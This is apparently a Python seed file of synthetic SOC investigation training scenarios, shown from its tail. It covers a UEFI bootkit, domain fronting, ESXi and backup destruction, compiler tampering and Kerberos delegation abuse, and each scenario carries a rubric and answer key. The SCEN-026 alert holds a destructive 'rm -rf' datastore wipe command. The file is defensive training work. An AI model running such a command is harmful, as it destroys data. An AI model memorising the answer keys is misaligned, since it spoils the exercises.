                {"id": "c-1", "name": "Correlation: Bootkit survives full OS drive reformat and reinstall"},
                {"id": "c-2", "name": "Distractor: Correlate with display resolution refresh rate"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "UEFI bootkit implanted in motherboard SPI flash maintaining persistent pre-OS execution"},
                {"id": "h-2", "name": "Corrupted Windows update causing non-malicious boot failure"},
            ],
            mitre=[
                {"id": "T1542.001", "name": "T1542.001 - Pre-OS Boot: System Firmware"},
            ],
            responses=[
                {"id": "r-1", "name": "Decommission motherboard, reflash BIOS via hardware programmer using vendor-signed firmware, and enable hardware Root of Trust", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Reinstall Windows on the hard drive and put computer back in production", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "CRITICAL",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1542.001"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["Notice the TPM PCR0 measurement mismatch.", "The malware runs before the Windows kernel loads.", "Drive reformatting does NOT remove UEFI firmware rootkits."],
            explanation="The adversary installed a UEFI bootkit into the motherboard SPI flash memory. Hardware reflashing or motherboard replacement is mandatory.",
        )
    )

    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-025",
            title="Advanced C2: Fast-Flux DNS & Domain Fronting",
            difficulty=ScenarioDifficulty.EXPERT,
            category=ScenarioCategory.NETWORK_INVESTIGATION,
            description="Egress inspection identifies traffic to major cloud CDN fronting a hidden adversary C2 server with TTL 60s fast-flux resolvers.",
            learning_objectives=["Detect domain fronting via SNI vs HTTP Host header discrepancies", "Analyze fast-flux DNS IP rotation patterns", "Implement TLS inspection and Host header validation"],
            signal={"alert": "SNI_HOST_HEADER_MISMATCH", "sni": "d111111abcdef8.cloudfront.net", "http_host": "c2-covert-apt.org", "severity": "CRITICAL"},
            evidence=[
                {"id": "ev-1", "name": "TLS SNI vs HTTP Host Header Mismatch", "type": "PCAP", "description": "TLS ClientHello SNI presents legitimate CDN domain while internal encrypted HTTP Host header routes to adversary tenant."},
                {"id": "ev-2", "name": "Fast-Flux DNS A Record Resolution", "type": "DNS", "description": "Resolved IP address changes across 40 distinct global autonomous systems every 60 seconds."},
                {"id": "ev-3", "name": "Distractor: Akamai CDN Video Delivery", "type": "CDN", "description": "Static image asset caching."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Host process communicates through TLS tunnel evading standard URL category filtering"},
                {"id": "c-2", "name": "Distractor: Correlate with weather widget updates"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "Nation-state level domain fronting through commercial CDN concealing resilient fast-flux C2"},
                {"id": "h-2", "name": "Broken CDN reverse proxy configuration from marketing vendor"},
            ],
            mitre=[
                {"id": "T1090.004", "name": "T1090.004 - Proxy: Domain Fronting"},
                {"id": "T1568.001", "name": "T1568.001 - Dynamic Resolution: Fast Flux DNS"},
            ],
            responses=[
                {"id": "r-1", "name": "Enforce strict SNI/Host header matching on web proxy, report rogue tenant to CDN security team, and isolate endpoint", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Whitelist entire CloudFront CDN IP range", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "CRITICAL",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1090.004", "T1568.001"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["Notice the difference between the TLS SNI and the HTTP Host header.", "Fast-flux rotates IPs every 60 seconds across multiple ASNs.", "Enforce SNI/Host header matching on proxy."],
            explanation="Domain fronting concealed malicious traffic behind a reputable CDN. Block the discrepancy and alert the upstream CDN abuse desk.",
        )
    )

    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-026",
            title="Catastrophic Sabotage: Hypervisor & Backup Deletion",
            difficulty=ScenarioDifficulty.EXPERT,
            category=ScenarioCategory.INCIDENT_RESPONSE,
            description="ESXi management console shows root logins via SSH executing esxcli commands terminating all VMs and wiping datastores.",
            learning_objectives=["Investigate ESXi hypervisor security logs", "Respond to mass virtualization destructive attacks", "Execute out-of-band immutable air-gapped recovery"],
            signal={"alert": "ESXI_DATASTORE_WIPE", "hypervisor": "esxi-cluster-01", "command": "rm -rf /vmfs/volumes/Datastore_SAN_01/*", "severity": "CRITICAL"},
            evidence=[
                {"id": "ev-1", "name": "ESXi Shell Command Audit Log", "type": "ESXI_LOG", "description": "esxcli vm process kill --type=force executed for all 64 enterprise virtual machines."},
                {"id": "ev-2", "name": "Veeam Backup Server Storage Deletion", "type": "BACKUP_LOG", "description": "Attacker logged into backup portal using compromised domain credentials and initiated immediate repository purge."},
                {"id": "ev-3", "name": "Distractor: SNMP CPU Temperature Polling", "type": "HARDWARE", "description": "Chassis temperature normal (24C)."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Actor demanded $10M extortion payment threatening permanent destruction"},
                {"id": "c-2", "name": "Distractor: Correlate with UPS battery self-test"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "Double-extortion ransomware campaign executing coordinated virtualization and backup destruction"},
                {"id": "h-2", "name": "Storage administrator making accidental script typo"},
            ],
            mitre=[
                {"id": "T1485", "name": "T1485 - Data Destruction"},
                {"id": "T1490", "name": "T1490 - Inhibit System Recovery"},
            ],
            responses=[
                {"id": "r-1", "name": "Sever ESXi management network, preserve storage controller logs, and invoke disaster recovery from immutable air-gapped tape/WORM backups", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Turn off power switches on SAN storage while writes are in progress risking hardware bricking", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "CRITICAL",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1485", "T1490"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["ESXi datastore destruction aims to maximize ransom leverage.", "Backups were targeted simultaneously.", "Only immutable / air-gapped backups can survive."],
            explanation="The attacker attempted complete operational destruction by wiping hypervisors and backup repositories. Recover strictly from immutable off-line storage.",
        )
    )

    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-027",
            title="State-Sponsored: Stealth CI/CD Runner Compiler Tampering",
            difficulty=ScenarioDifficulty.EXPERT,
            category=ScenarioCategory.THREAT_INTELLIGENCE,
            description="Cryptographic mismatch detected in compiled binary produced by build system despite clean source code repository.",
            learning_objectives=["Detect compiler-level backdoors (Reflections on Trusting Trust)", "Inspect transient CI/CD container build environments", "Enforce reproducible hermetic builds"],
            signal={"alert": "REPRODUCIBLE_BUILD_HASH_MISMATCH", "binary": "security_agent.exe", "source_commit": "verified_clean", "severity": "CRITICAL"},
            evidence=[
                {"id": "ev-1", "name": "Binary Disassembly Comparison", "type": "DISASSEMBLY", "description": "Compiled binary contains extra DLL injection logic in WinMain not present in source code repository."},
                {"id": "ev-2", "name": "Compromised Compiler Binary on Runner", "type": "SYSTEM", "description": "gcc/cl.exe binary on build worker modified to inject backdoor whenever compiling security_agent source."},
                {"id": "ev-3", "name": "Distractor: Git Branch Rebase Notice", "type": "GIT", "description": "Feature branch successfully rebased onto main."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Modified compiler was loaded via poisoned Docker build cache layer"},
                {"id": "c-2", "name": "Distractor: Correlate with Jira ticket status transition to In Progress"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "Ken Thompson hack style compiler tampering introducing backdoor during binary compilation without source changes"},
                {"id": "h-2", "name": "Compiler optimization flag (-O3) altering control flow graph"},
            ],
            mitre=[
                {"id": "T1195.002", "name": "T1195.002 - Supply Chain Compromise: Compromise Software Supply Chain"},
            ],
            responses=[
                {"id": "r-1", "name": "Halt all production releases, nuke CI/CD runner build cluster, rebuild compilers from verified bootstrap sources, and enforce hermetic builds", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Release binary to customers because source code in Git looks clean", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "CRITICAL",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1195.002"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["The source code in git is clean, but the compiled binary has a backdoor.", "Look at the compiler binary itself (cl.exe / gcc).", "Enforce hermetic, reproducible build environments."],
            explanation="The build compiler was subverted to inject malicious code during compilation. Rebuild the CI/CD infrastructure from verified bootstrap media.",
        )
    )

    scenarios.append(
        _build_scenario(
            scenario_id="SCEN-028",
            title="Apex Intrusion: Zero-Log Memory Stager with Unconstrained Delegation",
            difficulty=ScenarioDifficulty.EXPERT,
            category=ScenarioCategory.SOC_INVESTIGATION,
            description="SOC threat hunters identify reflective DLL injection operating completely in memory with Kerberos Unconstrained Delegation ticket theft.",
            learning_objectives=["Detect in-memory living-off-the-land reflective payloads", "Investigate Kerberos unconstrained delegation abuse", "Conduct memory triage and enterprise credential containment"],
            signal={"alert": "UNCONSTRAINED_DELEGATION_TICKET_CACHED", "computer": "PRINT-SRV-01", "ticket": "Administrator TGT", "severity": "CRITICAL"},
            evidence=[
                {"id": "ev-1", "name": "Memory Analysis of Spoolsv.exe", "type": "VOLATILITY", "description": "Spoolsv process memory contains injected reflective DLL with zero disk artifacts and hooked APIs."},
                {"id": "ev-2", "name": "TGT Extracted from Memory via Print Nightmare", "type": "KERBEROS", "description": "Adversary coerced Domain Controller to authenticate to Print Server, capturing Domain Controller machine TGT in memory."},
                {"id": "ev-3", "name": "Distractor: Printer Spooler Document Printed", "type": "PRINTER", "description": "2-page PDF document printed on Office Jet 5000."},
            ],
            correlations=[
                {"id": "c-1", "name": "Correlation: Computer object PRINT-SRV-01 configured with TRUSTED_FOR_DELEGATION attribute"},
                {"id": "c-2", "name": "Distractor: Correlate with printer toner cartridge low alert"},
            ],
            hypotheses=[
                {"id": "h-1", "name": "Printer spooler exploitation coupled with unconstrained Kerberos delegation yielding full Domain takeover"},
                {"id": "h-2", "name": "Legitimate print server driver update"},
            ],
            mitre=[
                {"id": "T1558.001", "name": "T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket"},
                {"id": "T1055.001", "name": "T1055.001 - Process Injection: Dynamic-link Library Injection"},
                {"id": "T1556", "name": "T1556 - Modify Authentication Process"},
            ],
            responses=[
                {"id": "r-1", "name": "Remove TRUSTED_FOR_DELEGATION from print server, disable Spooler service on domain controllers, isolate host, and reset KRBTGT", "type": "CONTAINMENT"},
                {"id": "r-2", "name": "Restart printer spooler service and ignore", "type": "HARMFUL"},
            ],
            rubric={
                "expected_severity": "CRITICAL",
                "correct_evidence_ids": ["ev-1", "ev-2"],
                "distractor_evidence_ids": ["ev-3"],
                "correct_correlations": ["c-1"],
                "correct_hypothesis_id": "h-1",
                "correct_mitre_techniques": ["T1558.001", "T1055.001", "T1556"],
                "optimal_responses": ["r-1"],
                "harmful_responses": ["r-2"],
            },
            hints=["Unconstrained delegation stores incoming TGTs in LSASS memory.", "Print Spooler was coerced to send Domain Controller TGT.", "Disable unconstrained delegation and perform KRBTGT password rotation."],
            explanation="The attacker coerced Domain Controller authentication to an unconstrained server and stole its TGT. Disable unconstrained delegation and reset domain credentials.",
        )
    )

    return scenarios


def seed_soc_scenarios(db: Session) -> list[SocScenario]:
    """Seed or update all 28 synthetic SOC investigation scenarios."""
    scenarios_data = get_all_scenario_definitions()
    seeded: list[SocScenario] = []

    for sc_data in scenarios_data:
        existing = (
            db.query(SocScenario)
            .filter(SocScenario.scenario_id == sc_data["scenario_id"])
            .first()
        )
        if existing:
            for k, v in sc_data.items():
                setattr(existing, k, v)
            existing.is_active = True
            scenario_obj = existing
        else:
            scenario_obj = SocScenario(**sc_data)
            db.add(scenario_obj)

        seeded.append(scenario_obj)

    db.commit()
    return seeded
